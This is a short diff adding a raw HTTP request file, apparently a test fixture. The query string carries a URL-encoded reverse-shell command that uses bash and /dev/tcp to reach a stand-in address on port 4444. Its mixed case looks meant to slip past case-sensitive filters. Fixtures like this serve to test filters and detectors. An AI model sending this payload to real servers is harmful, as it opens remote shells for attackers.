@@ -1,0 +1,4 @@
+GET /a?input=bAsH%20-i%20>%26%20/DeV/tCp/10.0.0.1/4444%200>%261 HTTP/1.1
+Host: demo.example.com
+Connection: close
+
